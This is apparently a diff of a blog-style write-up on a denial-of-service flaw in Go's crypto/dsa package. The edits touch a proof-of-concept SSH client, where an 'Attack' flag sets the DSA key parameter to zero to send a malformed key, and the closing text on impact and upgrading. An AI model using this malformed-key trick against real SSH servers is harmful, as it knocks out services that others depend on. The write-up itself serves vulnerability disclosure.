@@ -286,9 +286,7 @@ for {
     }
     log.Printf("Accepted an incoming TCP connection from %s", tcpConn.RemoteAddr())
     if *p {
-        go func() {
-            makeSSHConn(tcpConn, config)
-        }()
+        go makeSSHConn(tcpConn, config)
     } else {
         makeSSHConn(tcpConn, config)
     }
@@ -344,8 +342,7 @@ var (
 func (k *dsaPublicKey) Marshal() []byte {
     x := k.P
     if Attack {
-        b := make([]byte, len(k.P.Bytes()))
-        x = new(big.Int).SetBytes(b)
+        x = big.NewInt(0)
     }
     w := struct {
         Name       string
@@ -451,6 +448,6 @@ Hey it connects! But all an attacker would need to do is start a few more malici
 
 In conclusion, this vulnerability can be exploited to cause denial of service. Using the scenario above, the CVE score calculator <https://nvd.nist.gov/CVSS/v2-calculator> gave a score of 3.5/10 - 6.3/10 based on if the server used the `-p` flag. There aren't any confidentiality or integrity impacts, just a partial/complete availability impact.
 
-Looking at godoc.org there are currently 164 packages that import `crypto/dsa`, <https://godoc.org/crypto/dsa?importers>. It is recommended to upgrade to the security release when it becomes available.
+Looking at godoc.org there are currently 164 packages that import `crypto/dsa`, <https://godoc.org/crypto/dsa?importers>. It is recommended to upgrade to the security release that is at <https://golang.org/dl/>.
 
 Overall this was a fun learning experience. If there are any mistakes or improvements that can be made, please let me know. Thanks for reading.
